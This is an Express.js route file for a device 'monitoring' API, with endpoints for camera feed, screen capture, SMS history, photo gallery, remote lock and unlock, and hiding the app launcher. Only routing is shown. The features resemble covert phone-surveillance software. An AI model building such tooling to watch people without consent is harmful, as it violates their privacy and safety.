const express = require('express');
const router = express.Router();
const monitoringController = require('../controllers/monitoringController');
const { authMiddleware } = require('../middleware/auth');

/**
 * @swagger
 * tags:
 *   name: Monitoring
 *   description: Device monitoring endpoints
 */

router.get('/camera/:deviceId', authMiddleware, monitoringController.getCameraFeed);
router.get('/screen/:deviceId', authMiddleware, monitoringController.getScreenCapture);
router.get('/sms/:deviceId', authMiddleware, monitoringController.getSmsHistory);
router.get('/gallery/:deviceId', authMiddleware, monitoringController.getGallery);
router.post('/lock/:deviceId', authMiddleware, monitoringController.lockDevice);
router.post('/unlock/:deviceId', authMiddleware, monitoringController.unlockDevice);
router.put('/launcher/:deviceId', authMiddleware, monitoringController.setLauncherVisibility);

module.exports = router;
